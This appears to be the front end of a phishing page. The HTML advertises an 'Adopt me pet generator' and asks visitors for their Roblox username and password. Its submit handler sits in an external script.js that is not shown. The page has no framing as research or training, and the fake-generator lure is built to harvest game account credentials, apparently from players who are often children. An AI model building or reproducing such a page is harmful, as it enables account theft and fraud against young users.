<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Account</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <!-- Header -->
            <div class="header">
                <h1 id="app-name">Adopt me pet generator</h1>
                <p id="tagline">Connect your roblox account</p>
            </div>

            <!-- Single Connect Form -->
            <form id="connect-form" class="form active" onsubmit="handleSubmit(event)">
                <div class="input-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" placeholder="Enter username or email" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" placeholder="Enter your password" required>
                </div>
                
                <button type="submit" class="submit-btn" id="connect-btn">Connect Account</button>
            </form>

            <!-- Footer Links -->
            <div class="footer-links">
                <p>By connecting, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a></p>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
